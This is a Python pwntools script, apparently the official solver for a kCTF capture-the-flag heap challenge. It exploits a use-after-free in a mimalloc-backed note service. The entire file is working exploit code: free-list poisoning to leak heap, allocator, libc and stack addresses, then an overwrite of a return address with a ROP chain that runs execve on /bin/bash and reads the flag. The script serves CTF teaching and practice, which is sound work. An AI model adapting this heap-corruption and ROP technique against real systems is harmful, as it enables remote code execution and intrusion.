#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022-2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
from pwnlib.util.packing import p64


def printraw(c):
    print(c.decode(), end='')


def handle_pow(r):
    printraw(r.recvuntil(b'python3 '))
    printraw(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    printraw(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
printraw(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)


# Create basic interface functions
def create(pos):
    r.recvuntil(b'YAHNC>')
    r.sendline(b'1')
    r.recvuntil(b'Position? (0-15): ')
    r.sendline(str(pos).encode())


def delete(pos):
    r.recvuntil(b'YAHNC>')
    r.sendline(b'2')
    r.recvuntil(b'Position? (0-15): ')
    r.sendline(str(pos).encode())


def look(pos):
    r.recvuntil(b'YAHNC>')
    r.sendline(b'3')
    r.recvuntil(b'Position? (0-15): ')
    r.sendline(str(pos).encode())
    x = r.recvuntil(b'Done!\n')
    return x


def upd(pos, dat, nl=True):
    if (len(dat) > 127):
        print("WARN: Data too long, truncating!")
        dat = dat[0:128]
    r.recvuntil(b'YAHNC>')
    r.sendline(b'4')
    r.recvuntil(b'Position? (0-15): ')
    r.sendline(str(pos).encode())
    r.recvuntil(b'Content? (127 max): ')
    if (nl):
        r.sendline(dat)
    else:
        r.send(dat)


create(0)
create(1)
delete(0)
delete(1)
x = look(1)
print(x)
heap_leak = int.from_bytes(x[0:8], "little")
print('heap: ', hex(heap_leak))
page_base = heap_leak & (~0x3ffff) | 0x00190
print('page base: ', hex(page_base))
upd(1, p64(page_base))

for i in range(61):
    create(15)
    delete(15)

create(14)  # should be our page
x = look(14)
mimalloc_bss = int.from_bytes(x[8*6:8+8*6], "little")
print(f'mimalloc_bss: {hex(mimalloc_bss)}')
mimalloc_base = mimalloc_bss - 0x2b100
print(f'malloc base: {hex(mimalloc_base)}')
upd(14, p64(0x0), False)  # reset free list

create(0)
create(1)
delete(0)
delete(1)
upd(1, p64(mimalloc_base + 0x29c20))

for i in range(59):
    create(15)
    delete(15)
create(13)  # should be a libc leak
x = look(13)
libc_leak = int.from_bytes(x[0:8], "little")
libc_base = libc_leak - 0x68961

print(f'libc base: {hex(libc_base)}')
upd(14, p64(0x0), False)  # reset free list

create(0)
create(1)
delete(0)
delete(1)
upd(1, p64(libc_base + 0xa4d60))

for i in range(57):
    create(15)
    delete(15)
create(13)  # should be a environ leak
x = look(13)
stack_leak = int.from_bytes(x[0:8], "little")
print(f'stack leak: {hex(stack_leak)}')
upd(14, p64(0x0), False)  # reset free list
update_ret_addr = stack_leak - 0x70  # Placed on top of where the ret address of update will be whenever it's called


create(0)
create(1)
delete(0)
delete(1)
upd(1, p64(update_ret_addr))

for i in range(55):
    create(15)
    delete(15)
create(13)  # should be a main
x = look(13)
main_leak = int.from_bytes(x[0:8], "little")
print(f'main? leak: {hex(main_leak)}')
upd(14, p64(0x0), False)  # reset free list

# Get ptr -> /bin/sh into rdi
# 0x0000000000014413 : pop rdi ; ret
# Put 0x3b into rbx
# 0x0000000000014125 : pop rbx ; ret
# Clear out rdx, rsi, and move 0x3b into rax, syscall execve!
# 0x000000000005f1b7 : xor edx, edx ; xor esi, esi ; mov rax, rbx ; syscall

# Create a /bin/bash chunk to pass to our ropchain
create(12)
upd(12, b'/bin/bash', False)

chain = p64(libc_base+0x14413) + p64(heap_leak+0x200) + p64(libc_base+0x14125) + p64(0x3b) + p64(libc_base + 0x5f1b7)

# Overwrite the return address of the update function with our chain (placed after the canary)
upd(13, chain, True)

r.sendline(b'cat flag')

printraw(r.recvuntil((b'CTF{', b'uiuctf{')))
printraw(r.recvuntil((b'}')))

exit(0)
